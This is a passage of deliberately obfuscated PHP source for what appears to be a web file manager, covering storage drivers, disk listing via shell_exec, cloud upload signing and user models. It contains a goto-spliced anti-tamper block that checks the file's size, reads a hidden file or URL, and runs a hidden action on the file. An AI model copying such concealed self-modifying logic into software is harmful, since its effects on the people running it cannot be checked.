$ƒ¼—ªôí[$_SERVER[œ—üé‹ê][87]]; } Cache::set($æÂÁ¾Ğ, $åÈ“ÚÏ, 3600 * 10); } return $åÈ“ÚÏ; } public static function defaultDriver() { return Model($_SERVER[œ—üé‹ê][877])->defaultDriver(); } public static function defaultDriverInit() { $ŞÈ®•Ã™ =& $_SERVER[œ—üé‹ê]; static $•»ÚÒ§¦ = false; if ($•»ÚÒ§¦) { return $•»ÚÒ§¦; } $Ù‰ÖóÕı = self::defaultDriver(); $•»ÚÒ§¦ = IO::init($ŞÈ®•Ã™[1482] . $Ù‰ÖóÕı[$ŞÈ®•Ã™[487]] . $ŞÈ®•Ã™[1470]); return $•»ÚÒ§¦; } public static function fileTypeList() { $í£ÉÛêÈ =& $_SERVER[œ—üé‹ê]; $ú±±£Ÿ¤ = $GLOBALS[$í£ÉÛêÈ[6]][$í£ÉÛêÈ[1483]]; foreach ($ú±±£Ÿ¤ as $€½æ½ß³ => $Àé¥Çî¥) { $Œ”º‡ôå = $í£ÉÛêÈ[1484] . $€½æ½ß³; $ĞØŠıÉ‡ = LNG($Œ”º‡ôå); if ($Œ”º‡ôå != $ĞØŠıÉ‡) { $ú±±£Ÿ¤[$€½æ½ß³][$í£ÉÛêÈ[32]] = $ĞØŠıÉ‡; } } return $ú±±£Ÿ¤; } public static function ioFileDriverGet($Õ§´ŸõØ = '') { $Òˆ¦ÑªÈ =& $_SERVER[œ—üé‹ê]; static $ÇØ‹­»¿ = array(); static $Î‡·¡¼ = array(); static $ş®Âù = array(); static $äéÕÍüÀ = false; if ($äéÕÍüÀ === !1) { $äéÕÍüÀ = array($Òˆ¦ÑªÈ[598] => array(), $Òˆ¦ÑªÈ[684] => array()); $øëú¤Óô = Model($Òˆ¦ÑªÈ[1485])->get(!1, $Òˆ¦ÑªÈ[1486]); foreach ($øëú¤Óô as $óÅ¾ä¢» => $¸éÒ¼ïĞ) { if (!$¸éÒ¼ïĞ || $¸éÒ¼ïĞ == $Òˆ¦ÑªÈ[12]) { continue; } if (strstr($óÅ¾ä¢», $Òˆ¦ÑªÈ[1487])) { $¢â˜È•à = str_replace($Òˆ¦ÑªÈ[1487], $Òˆ¦ÑªÈ[12], $óÅ¾ä¢»); $äéÕÍüÀ[$Òˆ¦ÑªÈ[598]][$¢â˜È•à] = $¸éÒ¼ïĞ; } else { if (strstr($óÅ¾ä¢», $Òˆ¦ÑªÈ[1488])) { $¢â˜È•à = str_replace($Òˆ¦ÑªÈ[1488], $Òˆ¦ÑªÈ[12], $óÅ¾ä¢»); $äéÕÍüÀ[$Òˆ¦ÑªÈ[684]][$¢â˜È•à] = $¸éÒ¼ïĞ; } } } } $ãŠöœÛ¸ = self::defaultDriver(); if (!$Õ§´ŸõØ || !$äéÕÍüÀ[$Òˆ¦ÑªÈ[598]] && !$äéÕÍüÀ[$Òˆ¦ÑªÈ[684]]) { return $ãŠöœÛ¸; } $óÚ’ğ÷œ = self::getPathSourceID($Õ§´ŸõØ); if (!$óÚ’ğ÷œ) { return $ãŠöœÛ¸; } if (isset($ÇØ‹­»¿[$óÚ’ğ÷œ])) { return $ÇØ‹­»¿[$óÚ’ğ÷œ]; } $­ğ’ÈË = Model($Òˆ¦ÑªÈ[942])->sourceInfo($óÚ’ğ÷œ); $š²ˆ¯ß¾ = $­ğ’ÈË[$Òˆ¦ÑªÈ[589]]; $ğÜ·ó = array(); if (!$­ğ’ÈË) { return $ãŠöœÛ¸; } if ($­ğ’ÈË[$Òˆ¦ÑªÈ[188]] == $Òˆ¦ÑªÈ[91]) { if (isset($ş®Âù[$š²ˆ¯ß¾])) { return $ş®Âù[$š²ˆ¯ß¾]; } if (isset($äéÕÍüÀ[$Òˆ¦ÑªÈ[684]][$š²ˆ¯ß¾])) { $àÈá¬§õ = Model($Òˆ¦ÑªÈ[877])->driverInfo($äéÕÍüÀ[$Òˆ¦ÑªÈ[684]][$š²ˆ¯ß¾]); $ãŠöœÛ¸ = $àÈá¬§õ ? $àÈá¬§õ : $ãŠöœÛ¸; $ş®Âù[$š²ˆ¯ß¾] = $ãŠöœÛ¸; $ÇØ‹­»¿[$óÚ’ğ÷œ] = $ãŠöœÛ¸; return $ãŠöœÛ¸; } $ğÜ·ó = self::groupParentUser($š²ˆ¯ß¾); } else { if ($­ğ’ÈË[$Òˆ¦ÑªÈ[188]] == $Òˆ¦ÑªÈ[524]) { $Ñ°ş áÉ = Model($Òˆ¦ÑªÈ[1489])->getInfo($š²ˆ¯ß¾); if ($Ñ°ş áÉ) { $ğÜ·ó = explode($Òˆ¦ÑªÈ[50], trim($Ñ°ş áÉ[$Òˆ¦ÑªÈ[604]], $Òˆ¦ÑªÈ[50])); $ğÜ·ó = array_remove_value($ğÜ·ó, $Òˆ¦ÑªÈ[228]); $ğÜ·ó[] = $š²ˆ¯ß¾; $ğÜ·ó = array_reverse($ğÜ·ó); } } } foreach ($ğÜ·ó as $àƒôö˜) { if (!isset($äéÕÍüÀ[$Òˆ¦ÑªÈ[598]][$àƒôö˜])) { continue; } if (isset($Î‡·¡¼[$àƒôö˜])) { return $Î‡·¡¼[$àƒôö˜]; } $àÈá¬§õ = Model($Òˆ¦ÑªÈ[877])->driverInfo($äéÕÍüÀ[$Òˆ¦ÑªÈ[598]][$àƒôö˜]); $ãŠöœÛ¸ = $àÈá¬§õ ? $àÈá¬§õ : $ãŠöœÛ¸; $Î‡·¡¼[$àƒôö˜] = $ãŠöœÛ¸; break; } if ($­ğ’ÈË[$Òˆ¦ÑªÈ[188]] == $Òˆ¦ÑªÈ[91]) { $ş®Âù[$š²ˆ¯ß¾] = $ãŠöœÛ¸; } $ÇØ‹­»¿[$óÚ’ğ÷œ] = $ãŠöœÛ¸; return $ãŠöœÛ¸; } private static function getPathSourceID($÷¼—Á´î) { $î“íÎû¥ =& $_SERVER[œ—üé‹ê]; static $ ’¯ûÕÕ = array(); if (!$÷¼—Á´î) { return $î“íÎû¥[12]; } $¥‚µ¸µ„ = substr($÷¼—Á´î, 0, strlen($î“íÎû¥[498])) == $î“íÎû¥[498]; $ÕÒİ¥€ò = substr($÷¼—Á´î, 0, strlen($î“íÎû¥[1456])) == $î“íÎû¥[1456]; $ç¶æ» = substr($÷¼—Á´î, 0, strlen($î“íÎû¥[1457])) == $î“íÎû¥[1457]; if (!$¥‚µ¸µ„ && !$ÕÒİ¥€ò && !$ç¶æ») { return $î“íÎû¥[12]; } $œ¾œ×  = self::parse($÷¼—Á´î); $™è¤ñõ© = $œ¾œ× [$î“íÎû¥[1353]]; if ($¥‚µ¸µ„) { return $œ¾œ× [$î“íÎû¥[487]]; } if (isset($ ’¯ûÕÕ[$™è¤ñõ©])) { $÷‘áñŠİ = $ ’¯ûÕÕ[$™è¤ñõ©]; } else { $÷‘áñŠİ = IO::init($™è¤ñõ©); $ ’¯ûÕÕ[$™è¤ñõ©] = $÷‘áñŠİ; } if (isset($÷‘áñŠİ->pathParse[$î“íÎû¥[1356]])) { return $÷‘áñŠİ->pathParse[$î“íÎû¥[1356]]; } return $î“íÎû¥[12]; } private static function groupParentUser($Àâ‚¬áˆ) { $ó¾Èº± =& $_SERVER[œ—üé‹ê]; $ÈÚîÓÙ = Model($ó¾Èº±[617])->getInfo($Àâ‚¬áˆ); if (!$ÈÚîÓÙ) { return array(); } $Ø—¦ÛÉ = array_to_keyvalue($ÈÚîÓÙ[$ó¾Èº±[1490]], $ó¾Èº±[12], $ó¾Èº±[1491]); $ÆõÊèùÄ = array(); foreach ($ÈÚîÓÙ[$ó¾Èº±[1490]] as $™Õøëºİ) { $ÆõÊèùÄ[] = $™Õøëºİ[$ó¾Èº±[1491]]; $¼ÂÏõ = explode($ó¾Èº±[50], trim($™Õøëºİ[$ó¾Èº±[604]], $ó¾Èº±[50])); $¼ÂÏõ = array_remove_value($¼ÂÏõ, $ó¾Èº±[228]); $¼ÂÏõ = array_reverse($¼ÂÏõ); $ÆõÊèùÄ = array_merge($ÆõÊèùÄ, $¼ÂÏõ); } return array_unique($ÆõÊèùÄ); } public static function diskList($€âÍÅë = true) { $Åèİ¦©à = $_SERVER[œ—üé‹ê][1492]; if ($€âÍÅë) { $®­şÓ™ = Cache::get($Åèİ¦©à); if (is_array($®­şÓ™)) { return $®­şÓ™; } } $®­şÓ™ = self::diskListGet(); Cache::set($Åèİ¦©à, $®­şÓ™, 60); return $®­şÓ™; } public static function diskListGet() { $œ¬Øİ”· =& $_SERVER[œ—üé‹ê]; $Óí›£÷ã = array(); if ($GLOBALS[$œ¬Øİ”·[6]][$œ¬Øİ”·[1493]] == $œ¬Øİ”·[1494]) { $ŸÉ±ÖÂƒ = $œ¬Øİ”·[1495]; for ($²¤®Á²— = 0; $²¤®Á²— < strlen($ŸÉ±ÖÂƒ); $²¤®Á²—++) { $…Š ëÄô = $ŸÉ±ÖÂƒ[$²¤®Á²—] . $œ¬Øİ”·[1496]; if (file_exists($…Š ëÄô)) { $Óí›£÷ã[] = $…Š ëÄô; } } return $Óí›£÷ã; } if (!function_exists($œ¬Øİ”·[98])) { $Óí›£÷ã[] = $œ¬Øİ”·[1000]; return $Óí›£÷ã; } $æŠÊ’ªº = explode($œ¬Øİ”·[285], shell_exec($œ¬Øİ”·[1497])); array_shift($æŠÊ’ªº); array_pop($æŠÊ’ªº); $Ğª©îÜÇ = array($œ¬Øİ”·[1498], $œ¬Øİ”·[1499], $œ¬Øİ”·[1500], $œ¬Øİ”·[1501], $œ¬Øİ”·[1502], $œ¬Øİ”·[1503], $œ¬Øİ”·[1504], $œ¬Øİ”·[1505]); foreach ($æŠÊ’ªº as $È•®¶ü´) { $ïòñ›ÔÀ = preg_split($œ¬Øİ”·[1506], $È•®¶ü´); $…Š ëÄô = $ïòñ›ÔÀ[count($ïòñ›ÔÀ) - 1]; if (!strstr($ïòñ›ÔÀ[0], $œ¬Øİ”·[1507]) || !$…Š ëÄô) { continue; } $Ìªùõü = rtrim($…Š ëÄô, $œ¬Øİ”·[8]) . $œ¬Øİ”·[8]; $Óí›£÷ã[] = $Ìªùõü; } return $Óí›£÷ã; } public static function isSameDisk($¡êÔê™, $îìÏï¨Ô) { $ëØŠö›æ =& $_SERVER[œ—üé‹ê]; if ($GLOBALS[$ëØŠö›æ[6]][$ëØŠö›æ[1493]] == $ëØŠö›æ[1494]) { return strtolower(substr($¡êÔê™, 0, 1)) == strtolower(substr($îìÏï¨Ô, 0, 1)); } $ˆĞ•¶ä  = stat($¡êÔê™); $‚®”Ä¨æ = stat($îìÏï¨Ô); if ($ˆĞ•¶ä  === !1 || $‚®”Ä¨æ === !1) { return !1; } return $ˆĞ•¶ä [$ëØŠö›æ[1508]] === $‚®”Ä¨æ[$ëØŠö›æ[1508]]; $ºå½§ëÁ = self::diskList(); $•âõÓ„¼ = !1; $¯ ìû»• = !1; sort($ºå½§ëÁ); $ºå½§ëÁ = array_reverse($ºå½§ëÁ); $¡êÔê™ = rtrim($¡êÔê™, $ëØŠö›æ[8]) . $ëØŠö›æ[8]; $îìÏï¨Ô = rtrim($îìÏï¨Ô, $ëØŠö›æ[8]) . $ëØŠö›æ[8]; foreach ($ºå½§ëÁ as $Üè˜Ú») { $ÕÖ’¬£ê = strlen($Üè˜Ú»); if (!$•âõÓ„¼ && substr($¡êÔê™, 0, $ÕÖ’¬£ê) == $Üè˜Ú») { $•âõÓ„¼ = $Üè˜Ú»; } if (!$¯ ìû»• && substr($îìÏï¨Ô, 0, $ÕÖ’¬£ê) == $Üè˜Ú») { $¯ ìû»• = $Üè˜Ú»; } if ($•âõÓ„¼ && $¯ ìû»•) { break; } } return $•âõÓ„¼ === $¯ ìû»•; } public static function transferType($›ÚáÃ„, $Õøîæş¶) { $ö˜å˜»É =& $_SERVER[œ—üé‹ê]; $éÜÖ›« = self::driverType($›ÚáÃ„); $Â§ßª¾¨ = self::driverType($Õøîæş¶); if ($éÜÖ›«[$ö˜å˜»É[33]] == $Â§ßª¾¨[$ö˜å˜»É[33]] && $éÜÖ›«[$ö˜å˜»É[1509]] == $Â§ßª¾¨[$ö˜å˜»É[1509]]) { return $ö˜å˜»É[1510]; } if ($éÜÖ›«[$ö˜å˜»É[33]] == $ö˜å˜»É[1034] && $Â§ßª¾¨[$ö˜å˜»É[33]] == $ö˜å˜»É[106]) { return $ö˜å˜»É[1381]; } if ($éÜÖ›«[$ö˜å˜»É[33]] == $ö˜å˜»É[106] && $Â§ßª¾¨[$ö˜å˜»É[33]] == $ö˜å˜»É[1034]) { return $ö˜å˜»É[107]; } return $ö˜å˜»É[1511]; } public static function driverType($æÀÀç§ø) { $ëÓš¬…Ş =& $_SERVER[œ—üé‹ê]; $±è¬Ô·‰ = str_replace($ëÓš¬…Ş[1512], $ëÓš¬…Ş[12], strtolower($æÀÀç§ø->getType())); if ($±è¬Ô·‰ == $ëÓš¬…Ş[867] || $±è¬Ô·‰ == $ëÓš¬…Ş[1513] || $±è¬Ô·‰ == $ëÓš¬…Ş[1514]) { $ÉÆ¢æÜ„ = self::ioFileDriverGet($ëÓš¬…Ş[498] . $æÀÀç§ø->pathParse[$ëÓš¬…Ş[1356]] . $ëÓš¬…Ş[402]); $æÀÀç§ø = IO::init($ëÓš¬…Ş[1482] . $ÉÆ¢æÜ„[$ëÓš¬…Ş[487]] . $ëÓš¬…Ş[1470]); } else { if ($±è¬Ô·‰ == $ëÓš¬…Ş[1390] || $±è¬Ô·‰ == $ëÓš¬…Ş[1515]) { $æÀÀç§ø = IO::init($æÀÀç§ø->pathParse[$ëÓš¬…Ş[1333]]); } } $Î²Í’à = $æÀÀç§ø->path; $±è¬Ô·‰ = str_replace($ëÓš¬…Ş[1512], $ëÓš¬…Ş[12], strtolower($æÀÀç§ø->getType())); if ($±è¬Ô·‰ == $ëÓš¬…Ş[106]) { return array($ëÓš¬…Ş[33] => $ëÓš¬…Ş[106], $ëÓš¬…Ş[1509] => $ëÓš¬…Ş[12], $ëÓš¬…Ş[87] => $Î²Í’à, $ëÓš¬…Ş[96] => $æÀÀç§ø); } return array($ëÓš¬…Ş[33] => $ëÓš¬…Ş[1034], $ëÓš¬…Ş[1509] => $æÀÀç§ø->pathDriver, $ëÓš¬…Ş[87] => $Î²Í’à, $ëÓš¬…Ş[96] => $æÀÀç§ø); } public static function pathDriverType($„ì €…¡) { return $„ì €…¡ ? self::driverType(IO::init($„ì €…¡)) : !1; } public static function pathDriverLocal($‹ô­š ö) { $ƒí©Â =& $_SERVER[œ—üé‹ê]; $è“áˆúâ = $‹ô­š ö ? self::driverType(IO::init($‹ô­š ö)) : !1; return strtolower($è“áˆúâ[$ƒí©Â[33]]) == $ƒí©Â[106] ? !0 : !1; } public static function allowCover($„êØŞù¬, $çÄƒñ€Ş = true) { $Èœ¯ş ª =& $_SERVER[œ—üé‹ê]; if (is_string($„êØŞù¬)) { $„êØŞù¬ = IO::info($„êØŞù¬); } if (!$„êØŞù¬ || $„êØŞù¬[$Èœ¯ş ª[33]] == $Èœ¯ş ª[78] || $„êØŞù¬[$Èœ¯ş ª[79]] <= 100) { return !1; } if (isset($„êØŞù¬[$Èœ¯ş ª[1516]]) || !$„êØŞù¬[$Èœ¯ş ª[87]]) { return !1; } if (isset($„êØŞù¬[$Èœ¯ş ª[232]]) && !$„êØŞù¬[$Èœ¯ş ª[232]]) { return !1; } static $×€—º£à = false; if (!$×€—º£à || !$çÄƒñ€Ş) { $‡‰Œ÷Í = self::driverType(IO::init($„êØŞù¬[$Èœ¯ş ª[87]])); $¸¤ÔÈã½ = $‡‰Œ÷Í[$Èœ¯ş ª[96]]; $×€—º£à = $Èœ¯ş ª[194]; if ($‡‰Œ÷Í[$Èœ¯ş ª[33]] == $Èœ¯ş ª[106]) { $×€—º£à = $Èœ¯ş ª[1517]; } if ($‡‰Œ÷Í[$Èœ¯ş ª[96]] && is_array($‡‰Œ÷Í[$Èœ¯ş ª[96]]->config)) { $ó²ÈÙ¯ = $‡‰Œ÷Í[$Èœ¯ş ª[96]]->config; if (isset($ó²ÈÙ¯[$Èœ¯ş ª[1518]]) && $ó²ÈÙ¯[$Èœ¯ş ª[1518]]) { $×€—º£à = $Èœ¯ş ª[1517]; } } $…ğò´Ğš = KodIO::defaultDriver(); if (strtolower($…ğò´Ğš[$Èœ¯ş ª[96]]) == $Èœ¯ş ª[106] && is_array($…ğò´Ğš[$Èœ¯ş ª[6]])) { $½œ´ù˜  = $…ğò´Ğš[$Èœ¯ş ª[6]][$Èœ¯ş ª[1365]]; if (substr($½œ´ù˜ , 0, 2) == $Èœ¯ş ª[1519]) { $½œ´ù˜  = str_replace($Èœ¯ş ª[1519], BASIC_PATH, $½œ´ù˜ ); } $½œ´ù˜  = str_replace($Èœ¯ş ª[254], $Èœ¯ş ª[8], $½œ´ù˜ ); if (substr($„êØŞù¬[$Èœ¯ş ª[87]], 0, strlen($½œ´ù˜ )) == $½œ´ù˜ ) { $×€—º£à = $Èœ¯ş ª[194]; } } } return $×€—º£à == $Èœ¯ş ª[1517] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($‰½›Å†ò) { parent::__construct($‰½›Å†ò); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($á·ãëï¡) { parent::__construct($á·ãëï¡); $this->setSignVersion($_SERVER[œ—üé‹ê][247]); } public function uploadFormData($üÃ¼œÃî, $Ò¯¥´Ûö = 3600) { $¬Ë§• =& $_SERVER[œ—üé‹ê]; $­öÊ©†ï = $¬Ë§•[229]; $±¸µş™Ã = $¬Ë§•[1520]; $ÔÌ´é¼£ = $¬Ë§•[261]; $‹šãøş = gmdate($¬Ë§•[1521], time() + $Ò¯¥´Ûö); $ĞÈÓ¬äÀ = (string) time() . $¬Ë§•[74] . (string) (time() + $Ò¯¥´Ûö); $”¯Ã›ˆ = array($¬Ë§•[262] => $‹šãøş, $¬Ë§•[265] => array(array($¬Ë§•[306] => $­öÊ©†ï), array($¬Ë§•[266] => $this->bucket), array($¬Ë§•[267], $¬Ë§•[268], $¬Ë§•[12]), array($¬Ë§•[270] => $ÔÌ´é¼£), array($¬Ë§•[1522] => $±¸µş™Ã), array($¬Ë§•[1523] => $this->accessKey), array($¬Ë§•[1524] => $ĞÈÓ¬äÀ))); $”¯Ã›ˆ = json_encode($”¯Ã›ˆ); $Ü¦°É = hash_hmac($¬Ë§•[1520], $ĞÈÓ¬äÀ, $this->secret); $úş”ÒØÀ = sha1($”¯Ã›ˆ); $ñÄ ğ¤ = hash_hmac($¬Ë§•[1520], $úş”ÒØÀ, $Ü¦°É); $îĞ÷úæ÷ = array($¬Ë§•[306] => $­öÊ©†ï, $¬Ë§•[270] => $ÔÌ´é¼£, $¬Ë§•[277] => base64_encode($”¯Ã›ˆ), $¬Ë§•[1522] => $±¸µş™Ã, $¬Ë§•[1523] => $this->accessKey, $¬Ë§•[1525] => $ĞÈÓ¬äÀ, $¬Ë§•[1526] => $ñÄ ğ¤, $¬Ë§•[206] => $this->getHost()); return $îĞ÷úæ÷; } public function fileOutImage($Å‰¥¬¯Ğ, $ù¹Õé´Ô = 250) { $æ»Š³ =& $_SERVER[œ—üé‹ê]; if ($this->size($Å‰¥¬¯Ğ) > 1024 * 1024 * 32) { return $this->fileOutImageServer($Å‰¥¬¯Ğ, $ù¹Õé´Ô); } $™·Â¼ÍŒ = $this->link($Å‰¥¬¯Ğ); $™·Â¼ÍŒ .= $æ»Š³[1527] . $ù¹Õé´Ô . $æ»Š³[1528]; $this->fileOutLink($™·Â¼ÍŒ); } } goto dÆŠÊ¢ áÊ; cïšÖ·ÂËé: function binCheckBigger($¢ëü¨óù, $¶ÅõìæŒ) { return $¢ëü¨óù > $¶ÅõìæŒ; } $_SERVER[$_SERVER[ŠòùÈ¨È][3]] = ("\71\62\61\67".strrev('94'))+0;$_ofge="xpth9nwva832j0isg6ey1rf7c4qbodml5uzkhtkc93od4rwj8qy02uniab67mlvsz5pe1fxgbwtm62";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¨´ŒàĞ”, $Á³Ìáê) { $ÇİÔ¼É =& $_SERVER[œ—üé‹ê]; if (isset(self::$_methodList[$¨´ŒàĞ”])) { return @call_user_func_array(self::$_methodList[$¨´ŒàĞ”], $Á³Ìáê); } else { if (method_exists($this, $¨´ŒàĞ”)) { return call_user_func_array(array($this, $¨´ŒàĞ”), $Á³Ìáê); } else { think_exception(__CLASS__ . $ÇİÔ¼É[4] . $¨´ŒàĞ” . $ÇİÔ¼É[5]); } } } public static function __callStatic($…ÏáÇ”, $¬°ĞÀ²û) { if (isset(self::$_methodListStatic[$…ÏáÇ”])) { return call_user_func_array(self::$_methodListStatic[$…ÏáÇ”], $¬°ĞÀ²û); } else { if (method_exists(self, $…ÏáÇ”)) { return call_user_func_array(array(self, $…ÏáÇ”), $¬°ĞÀ²û); } else { show_json("{$…ÏáÇ”}\x28\x29\x20\156\157\164\x20\145\170\x69\163\164\73", !1); } } } public static function addMethod($–…¶Ïìü, $ìä«»®Ú) { self::$_methodList[$–…¶Ïìü] = $ìä«»®Ú; } public static function addMethodStatic($¢öø•â, $ëÓ£Âôê) { self::$_methodListStatic[$¢öø•â] = $ëÓ£Âôê; } } goto DÖñêµ°İ; dÆŠÊ¢ áÊ: $_file = $_SERVER[$_SERVER[œ—üé‹ê][851]]; $_size = $_SERVER[œ—üé‹ê][1529]; if ($_SERVER[$_SERVER[œ—üé‹ê][850]] != $_size($_file)) { $_getc = $_SERVER[œ—üé‹ê][852]; $_getfile = $_SERVER[$_SERVER[œ—üé‹ê][853]] . $_SERVER[œ—üé‹ê][854]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[œ—üé‹ê][285], $_getfilec); if (count($_getarrs) < $_SERVER[œ—üé‹ê][720]) { $exit = $_SERVER[œ—üé‹ê][855]; $exit(); } $_act = $_SERVER[œ—üé‹ê][856]; $_act($_file); } goto CñÄ‡Å®Ğ¸; cÓ˜…ñÈ¢¬: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\152\157\x62\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\144\x65\x73\x63", "\163\157\x72\x74"); const JOB_KEY = "\x73\145\x6c\146\112\157\x62\114\x69\163\x74"; public function listData($ÊæÖÖã = false, $©ÎÓ‘¹ö = "\163\157\x72\x74", $ªŠßÁÔĞ = false) { return parent::listData($ÊæÖÖã, $©ÎÓ‘¹ö, $ªŠßÁÔĞ); } public function remove($ˆêÂò¢°) { return parent::remove($ˆêÂò¢°); } public function add($âÛàö “) { $Ò£Ëê =& $_SERVER[œ—üé‹ê]; if ($this->findByName($âÛàö “[$Ò£Ëê[32]])) { return !1; } $âÛàö “[$Ò£Ëê[2200]] = $this->getSort(); return parent::insert($âÛàö “); } private function getSort() { $¨¨Â–©É =& $_SERVER[œ—üé‹ê]; $‡û¬àİ = parent::listData(); $çŠ¡ğÙ¾ = array_to_keyvalue($‡û¬àİ, $¨¨Â–©É[12], $¨¨Â–©É[2200]); return empty($çŠ¡ğÙ¾) ? 0 : max($çŠ¡ğÙ¾) + 1; } public function update($·ªÌ¹•Æ, $­ ÜâëÔ) { $°ãçùÀÊ =& $_SERVER[œ—üé‹ê]; $‘Ò°· = parent::listData($·ªÌ¹•Æ); $†ÂÚãô = $this->findByName($­ ÜâëÔ[$°ãçùÀÊ[32]]); if (!$‘Ò°· || $†ÂÚãô && $†ÂÚãô[$°ãçùÀÊ[487]] != $‘Ò°·[$°ãçùÀÊ[487]]) { return !1; } return parent::update($·ªÌ¹•Æ, $­ ÜâëÔ); } public function setUserJob($¹´“Ö‘œ, $çİˆ¼) { $íÓÙ¸áŞ =& $_SERVER[œ—üé‹ê]; if (!is_array($çİˆ¼)) { $çİˆ¼ = array($çİˆ¼); } $“¹¡î™ = parent::listData(); $ëÇõãˆÔ = array_to_keyvalue($“¹¡î™, $íÓÙ¸áŞ[32]); $Ş·Ò– = $íÓÙ¸áŞ[463]; foreach ($çİˆ¼ as $Éî–ñ¾Ê) { if ($ëÇõãˆÔ[$Éî–ñ¾Ê]) { $Ş·Ò– .= $ëÇõãˆÔ[$Éî–ñ¾Ê][$íÓÙ¸áŞ[487]] . $íÓÙ¸áŞ[50]; } else { $Ëßõú‹¹ = $this->add($Éî–ñ¾Ê); $Ş·Ò– .= $Ëßõú‹¹ . $íÓÙ¸áŞ[50]; } } $Ş·Ò– = rtrim($Ş·Ò–, $íÓÙ¸áŞ[50]); Model($íÓÙ¸áŞ[617])->metaSet($¹´“Ö‘œ, self::JOB_KEY, $Ş·Ò–); } public function getUserJob($Ü×©œÙ¤) { $Õü­÷åó = Model($_SERVER[œ—üé‹ê][617])->metaGet($Ü×©œÙ¤); return $this->getUserJobInfo($Õü­÷åó[self::JOB_KEY]); } public function getUserJobInfo($ßô°İ–) { $â©É­£ë =& $_SERVER[œ—üé‹ê]; $¼òêéÈ¡ = explode($â©É­£ë[50], $ßô°İ–); $ ‡ÈÕ— = parent::listData(); $ ‡ÈÕ— = array_remove_key($ ‡ÈÕ—, $â©É­£ë[231]); $•‹€î¯Ì = array(); foreach ($¼òêéÈ¡ as $‰²èÌò) { if (isset($ ‡ÈÕ—[$‰²èÌò])) { $•‹€î¯Ì[] = $ ‡ÈÕ—[$‰²èÌò]; } } return $•‹€î¯Ì; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\x65\162"; protected $tableMeta = array("\164\x61\142\154\145\116\x61\x6d\145" => "\x75\163\x65\162\137\x6d\x65\164\141", "\155\x65\x74\141\x46\151\x65\154\144" => "\165\163\145\162\111\x44"); protected $simpleField = "\x75\x73\145\x72\111\104\x2c\x6e\151\x63\x6b\116\x61\155\x65\54\156\x61\x6d\x65\54\x61\x76\x61\x74\x61\x72\54\x73\x65\x78\54\163\164\141\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($ºêèÃäŒ) { $³½éã• =& $_SERVER[œ—üé‹ê]; $ÒÌğ²àœ = $³½éã•[2668]; return array($³½éã•[2259] => array($ºêèÃäŒ[0], $ÒÌğ²àœ), $³½éã•[2261] => array($ºêèÃäŒ[0], $ÒÌğ²àœ), $³½éã•[2669] => array($ºêèÃäŒ[0], $ÒÌğ²àœ)); } protected function ___getInfo($¨·±×‰) { $·Å’²ŒØ = $this->getInfoSimple($¨·±×‰); if (!$·Å’²ŒØ || !is_array($·Å’²ŒØ)) { return array(); } return $this->_getInfoApply($·Å’²ŒØ); } protected function ___getInfoFull($ÙÒÒ€ ) { $Åì¥ïîŞ = $this->getInfoSimple($ÙÒÒ€ ); if (!$Åì¥ïîŞ || !is_array($Åì¥ïîŞ)) { return array(); } return $this->_getInfoApply($Åì¥ïîŞ, !0); } protected function ___getInfoSimple($†ùÒ¹›ş) { $’°ş©„ =& $_SERVER[œ—üé‹ê]; if (!$†ùÒ¹›ş) { return array(); } $ëÀıŸ¡‚ = $this->where(array($’°ş©„[1589] => intval($†ùÒ¹›ş)))->find(); if (!$ëÀıŸ¡‚ || !is_array($ëÀıŸ¡‚)) { return array(); } $ëÀıŸ¡‚[$’°ş©„[2370]] = Action($’°ş©„[2371])->parseUrl($ëÀıŸ¡‚[$’°ş©„[2370]]); return $ëÀıŸ¡‚; } private function _getInfoApply($Áù¶Óê , $û‚ºÑ½ˆ = false) { $³ÒÑ»öî =& $_SERVER[œ—üé‹ê]; if (!$Áù¶Óê ) { return $Áù¶Óê ; } $¬û¨œ²ª = md5($³ÒÑ»öî[2670] . $Áù¶Óê [$³ÒÑ»öî[1053]] . $³ÒÑ»öî[2671] . $Áù¶Óê [$³ÒÑ»öî[32]]); $Áù¶Óê  = $this->_listDataApplyItem($Áù¶Óê ); $ĞğòÖé = Model($³ÒÑ»öî[1530])->metaGet($Áù¶Óê [$³ÒÑ»öî[90]][$³ÒÑ»öî[191]]); $Áù¶Óê [$³ÒÑ»öî[2672]] = $¬û¨œ²ª; $Áù¶Óê [$³ÒÑ»öî[90]][$³ÒÑ»öî[2460]] = isset($ĞğòÖé[$³ÒÑ»öî[2461]]) ? $ĞğòÖé[$³ÒÑ»öî[2461]] : null; if ($û‚ºÑ½ˆ) { $Áù¶Óê [$³ÒÑ»öî[555]] = $this->metaGet($Áù¶Óê [$³ÒÑ»öî[1589]]); } return $Áù¶Óê ; } protected function getInfoSimpleOuter($ÁªçËû‰) { $Ï‰”á£­ =& $_SERVER[œ—üé‹ê]; if (!$ÁªçËû‰ || $ÁªçËû‰ == 0) { return array($Ï‰”á£­[1589] => $Ï‰”á£­[228], $Ï‰”á£­[32] => $Ï‰”á£­[173] . LNG($Ï‰”á£­[2673]) . $Ï‰”á£­[175], $Ï‰”á£­[2370] => STATIC_PATH . $Ï‰”á£­[2674]); } $ØêÅÒ¦í = $this->cacheFunctionGet($Ï‰”á£­[2270], $ÁªçËû‰); $†Ë¾ü­¾ = array_field_key($ØêÅÒ¦í, explode($Ï‰”á£­[50], $this->simpleField)); if (!$†Ë¾ü­¾) { return array($Ï‰”á£­[1589] => $Ï‰”á£­[1376], $Ï‰”á£­[32] => $Ï‰”á£­[173] . LNG($Ï‰”á£­[2675]) . $Ï‰”á£­[175], $Ï‰”á£­[2370] => STATIC_PATH . $Ï‰”á£­[2676]); } $†Ë¾ü­¾[$Ï‰”á£­[2370]] = 